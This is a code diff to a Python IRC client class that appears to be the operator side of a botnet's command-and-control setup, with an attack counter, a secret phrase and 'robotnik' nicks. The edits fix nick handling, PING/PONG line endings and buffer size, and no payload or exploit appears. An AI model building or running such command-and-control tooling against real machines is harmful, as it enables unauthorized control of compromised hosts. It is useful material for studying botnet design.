@@ -12,10 +12,11 @@ class Controller_Client:
         self.port = port
         self.channel = "#" + channel
         self.secret_phrase = secret_phrase
-        self.contr_counter = random.randint(1,100)
-        self.nick = "controller" + str(self.contr_counter)
+        self.contr_counter = 1
+        self.nick = "rbtnik_controller" + str(self.contr_counter)
         self.irc_socket = None
         self.attack_counter = 0
+        # self.identifier = "Have you ever danced with the devil in the pale moonlight?"
 
     def start_client(self):
         connected, self.irc_socket = self.__attempt_connection(5)
@@ -27,7 +28,6 @@ class Controller_Client:
             self.log("Please enter the command you wish to execute: ")
         while connected:
             # executes if there is input to be read in
-            #TODO could make this an IF but might not work for multiple lines/large input?
             while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                 command = sys.stdin.readline()
                 if command:
@@ -122,7 +122,7 @@ class Controller_Client:
     def get_text(self):
         text = self.recv_msg() #receive the text
         if text.find('PING') != -1:
-            self.send_msg('PONG ' + text.split()[1] + 'rn')
+            self.send_msg('PONG ' + text.split()[1] + '\r\n')
         return text
     
     # attempts connection with an input timeout in seconds
@@ -156,7 +156,8 @@ class Controller_Client:
             conn_socket.send(("NICK "+ self.nick+"\n").encode()) # sets nick
             response = conn_socket.recv(2040).decode()
             if "433" in response:
-                self.contr_counter += 1
+                # add random number onto end of nick
+                self.contr_counter += random.randint(1,100)
                 self.nick = "robotnik" + str(self.contr_counter)
             elif "001" in response:
                 valid_nick = True
@@ -167,15 +168,15 @@ class Controller_Client:
 
     # functions to send/recv raw messages from IRC server
     def send_msg(self, message):
-        self.irc_socket.send(message.encode())
+        sent = self.irc_socket.send(message.encode())
 
     def recv_msg(self):
         self.irc_socket.settimeout(0.5)
         try:
-            data = self.irc_socket.recv(2040).decode()  #receive the text
+            data = self.irc_socket.recv(4096).decode()  #receive the text
         except socket.timeout:
             return ""
-        return data 
+        return data
 
     # functions to send/recv messages to channel
     def send_to_channel(self, message):
